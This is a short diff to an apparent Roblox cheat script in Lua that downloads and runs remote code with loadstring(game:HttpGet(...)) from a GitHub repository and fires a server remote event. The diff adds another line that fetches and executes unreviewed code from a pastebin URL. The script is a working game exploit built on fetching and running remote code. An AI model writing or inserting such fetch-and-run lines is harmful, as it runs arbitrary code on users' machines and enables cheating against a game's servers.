@@ -36,5 +36,6 @@ loadstring(game:HttpGet("https://raw.githubusercontent.com/feezaza123/bounty/mai
 loadstring(game:HttpGet("https://raw.githubusercontent.com/feezaza123/bounty/main/Sell", true))()
     game:GetService("ReplicatedStorage").dataRemoteEvent:FireServer(unpack(argsgg))
 else
+    loadstring(game:HttpGet("https://pastebin.com/raw/RUr10TJ0", true))()
     loadstring(game:HttpGet("https://raw.githubusercontent.com/feezaza123/bounty/main/Main", true))()
 end
